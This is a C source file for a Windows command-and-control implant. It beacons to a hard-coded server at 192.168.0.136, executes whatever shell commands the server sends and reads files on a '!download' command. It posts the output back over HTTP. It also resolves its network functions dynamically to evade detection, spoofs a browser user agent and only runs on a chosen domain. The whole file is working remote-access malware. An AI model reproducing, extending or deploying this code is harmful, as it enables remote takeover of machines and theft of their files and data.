#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdbool.h>
#include <time.h>
#include "api.h"

// Constants
#define SERVER_URL "http://192.168.0.136/"
#define SERVER_IP "192.168.0.136"
#define SLEEP_TIME 10000
#define DOMAIN "WINDEV2301"
#define BUFFER_SIZE 4096
#define ID_LENGTH 4
#define MAX_ARG_LENGTH 256
#define MAX_ARGS 10




// Function prototypes misc.
char* getTask(const char* clientId, HMODULE wininet);
char* taskIO(const char* data, const char* clientId, HMODULE wininet);
void sleepMilliseconds(DWORD milliseconds);
bool guardrails(const char* data);
bool compareString(const char *pre, const char *str);
void generateRandomString(char *str);
//https://stackoverflow.com/questions/8465006/how-do-i-concatenate-two-strings-in-c
char* concat(const char *s1, const char *s2);
void parseParams(const char* input, char *command, char *arguments[]);
void freeArguments(char *arguments[]);

// Function prototypes functionality
char* ReadFileContents(const char* filePath, DWORD* bytesRead);
char* execCmd(const char* cmd);


// Enum to define task types
typedef enum {
    CMD_TASK,
    CUSTOM_TASK
} TaskType;

// Function to get task type from task string
TaskType getTaskType(const char* task) {
    if (compareString("!", task)) {
        return CUSTOM_TASK;
    }
    return CMD_TASK;
}

int main() {

    srand(time(NULL));
    char clientId[ID_LENGTH+1];
    generateRandomString(clientId);
    //ShowWindow(GetConsoleWindow(), 0);

    if(!guardrails(DOMAIN))
        return 0;

    HMODULE wininet_dll = GetModuleHandle("wininet.dll");

    while (1) {
        char* newTask = getTask(clientId, wininet_dll);
        if (newTask != NULL && strlen(newTask) > 0) {
            printf("Task received %s\n", newTask);

            TaskType taskType = getTaskType(newTask);
            switch (taskType) {
                case CMD_TASK: {
                    char* taskResult = execCmd(newTask);
                    printf("%s\n", taskResult);
                    if (taskResult != NULL) {
                        taskIO(taskResult,clientId,wininet_dll);
                        free(taskResult);
                    }
                    free(newTask);
                    break;
                }
                case CUSTOM_TASK: {

                    char command[MAX_ARG_LENGTH];
                    char* arguments[MAX_ARGS+1]; //+1 for the NULL terminator

                    parseParams(newTask,command,arguments);

                    if(compareString("!download",command)){
                        DWORD bytesRead;
                        char* customTaskResult = ReadFileContents(arguments[0], &bytesRead);
                        freeArguments(arguments);
                        printf("%s\n", customTaskResult);
                        if (customTaskResult != NULL) {
                            taskIO(customTaskResult,clientId,wininet_dll);
                            free(customTaskResult);
                        }
                        free(newTask);
                        break;
                    }
                    break;
                }
                default:
                    free(newTask);
                    break;
            }
        }
        Sleep(SLEEP_TIME);
    }
    return 0;
}
char* getTask(const char* clientId, HMODULE wininet) {

    InternetOpenA_imported customInternetOpenA = (InternetOpenA_imported)GetProcAddress(wininet,"InternetOpenA");

    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    char* param = concat("?id=",clientId);

    char* URL = concat(SERVER_URL,param);
    InternetOpenUrlA_imported customInternetOpenUrlA = (InternetOpenUrlA_imported)GetProcAddress(wininet,"InternetOpenUrlA");
    HINTERNET hConnect = customInternetOpenUrlA(hInternet, URL, NULL, 0, INTERNET_FLAG_RELOAD, 0);

    free(param);
    free(URL);

    InternetCloseHandle_imported customInternetCloseHandle =(InternetCloseHandle_imported)GetProcAddress(wininet,"InternetCloseHandle");

    if (hConnect == NULL) {
        customInternetCloseHandle(hInternet);
        return NULL;
    }

    char buffer[BUFFER_SIZE];
    DWORD bytesRead;
    InternetReadFile_imported customInternetReadFile = (InternetReadFile_imported)GetProcAddress(wininet,"InternetReadFile");
    customInternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead);

    buffer[bytesRead] = '\0';

    char* task = _strdup(buffer);

    customInternetCloseHandle(hConnect);
    customInternetCloseHandle(hInternet);

    return task;
}

char* taskIO(const char* data,const char* clientId, HMODULE wininet) {

    InternetOpenA_imported customInternetOpenA = (InternetOpenA_imported)GetProcAddress(wininet,"InternetOpenA");

    HINTERNET hInternet = customInternetOpenA("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

    InternetConnectA_imported customInternetConnectA = (InternetConnectA_imported)GetProcAddress(wininet, "InternetConnectA");
    HINTERNET hConnect = customInternetConnectA(hInternet, SERVER_IP, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

    char* POST_URL = concat("/",clientId);

    HttpOpenRequestA_imported customHttpOpenRequestA = (HttpOpenRequestA_imported)GetProcAddress(wininet, "HttpOpenRequestA");

    HINTERNET hRequest = customHttpOpenRequestA(hConnect, "POST", POST_URL, NULL, NULL, NULL, 0, 0);
    free(POST_URL);

    char headers[] = "Content-Type: text/plain";

    HttpAddRequestHeadersA_imported customHttpAddRequestHeaders = (HttpAddRequestHeadersA_imported)GetProcAddress(wininet,"HttpAddRequestHeadersA");
    customHttpAddRequestHeaders(hRequest, headers, -1L, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);

    HttpSendRequestA_imported customHttpSendRequest = (HttpSendRequestA_imported)GetProcAddress(wininet, "HttpSendRequestA");
    customHttpSendRequest(hRequest, NULL, 0, (LPVOID)data, strlen(data));

    char buffer[BUFFER_SIZE];
    DWORD bytesRead;

    InternetReadFile_imported customInternetReadFile = (InternetReadFile_imported)GetProcAddress(wininet,"InternetReadFile");
    customInternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead);
    buffer[bytesRead] = '\0';

    char* response = _strdup(buffer);

    InternetCloseHandle_imported customInternetCloseHandle =(InternetCloseHandle_imported)GetProcAddress(wininet,"InternetCloseHandle");
    customInternetCloseHandle(hRequest);
    customInternetCloseHandle(hConnect);
    customInternetCloseHandle(hInternet);

    return response;
}

char* execCmd(const char* cmd) {
    // Create a pipe and execute the command
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) return NULL;
    char buffer[128];
    size_t bufferSize = 128;
    size_t resultSize = bufferSize;
    char* result = (char*)malloc(resultSize);
    result[0] = '\0';

    // Read Pipe
    while (fgets(buffer, bufferSize, pipe) != NULL) {
        size_t bufferLen = strlen(buffer);
        size_t resultLen = strlen(result);

        if (resultLen + bufferLen + 1 >= resultSize) {
            resultSize = resultLen + bufferLen + 1;
            result = (char*)realloc(result, resultSize);
        }

        strcat(result, buffer);
    }

    _pclose(pipe);

    return result;
}


bool guardrails(const char* domain){
    char* taskResult = execCmd("echo %USERDOMAIN%");

    if(compareString(domain,taskResult))
        return TRUE;

    return FALSE;
}

char* ReadFileContents(const char* filePath, DWORD* bytesRead) {
    HANDLE hFile;
    DWORD fileSize;
    DWORD bytesToRead;
    DWORD bytesActuallyRead;
    char* buffer = NULL;

    // Open the file
    hFile = CreateFileA(
        filePath,               // File path
        GENERIC_READ,           // Desired access
        FILE_SHARE_READ,        // Share mode
        NULL,                   // Security attributes
        OPEN_EXISTING,          // Creation disposition
        FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
        NULL                    // Template file handle
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Could not open file (error %lu)\n", GetLastError());
        return NULL;
    }

    // Get the file size
    fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("Could not get file size (error %lu)\n", GetLastError());
        CloseHandle(hFile);
        return NULL;
    }

    // Allocate memory for the file content
    buffer = (char*)malloc(fileSize + 1); // +1 for the null terminator
    if (buffer == NULL) {
        printf("Memory allocation failed\n");
        CloseHandle(hFile);
        return NULL;
    }

    // Read the file content
    bytesToRead = fileSize;
    if (!ReadFile(hFile, buffer, bytesToRead, &bytesActuallyRead, NULL)) {
        printf("Could not read file (error %lu)\n", GetLastError());
        free(buffer);
        CloseHandle(hFile);
        return NULL;
    }

    // Null-terminate the buffer
    buffer[bytesActuallyRead] = '\0';

    // Return the number of bytes read
    if (bytesRead) {
        *bytesRead = bytesActuallyRead;
    }

    // Close the file handle
    CloseHandle(hFile);

    return buffer;
}

bool compareString(const char *pre, const char *str)
{
    return strncmp(pre, str, strlen(pre)) == 0;
}

void generateRandomString(char *str) {
    char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int charsetSize = sizeof(charset) - 1;

    for (int i = 0; i < ID_LENGTH; i++) {
        int key = rand() % charsetSize;
        str[i] = charset[key];
    }
    str[ID_LENGTH] = '\0';
}

char* concat(const char *s1, const char *s2)
{
    char *result = malloc(strlen(s1) + strlen(s2) + 1); // +1 for the null-terminator
    // in real code you would check for errors in malloc here
    strcpy(result, s1);
    strcat(result, s2);
    return result;
}


void parseParams(const char *input, char *command, char *arguments[]) {
    char *token;
    char *input_copy = strdup(input); // Make a copy of the input string to avoid modifying the original
    int arg_count = 0;

    // Get the first token (the command)
    token = strtok(input_copy, " ");
    if (token != NULL) {
        strcpy(command, token);
    } else {
        command[0] = '\0'; // If no command found, set command to an empty string
    }

    // Get the arguments
    while ((token = strtok(NULL, " ")) != NULL && arg_count < MAX_ARGS) {
        arguments[arg_count] = strdup(token);
        arg_count++;
    }

    // Null-terminate the arguments array
    arguments[arg_count] = NULL;

    // Free the duplicated input string
    free(input_copy);
}

void freeArguments(char *arguments[]) {
    for (int i = 0; arguments[i] != NULL; i++) {
        free(arguments[i]);
    }
}

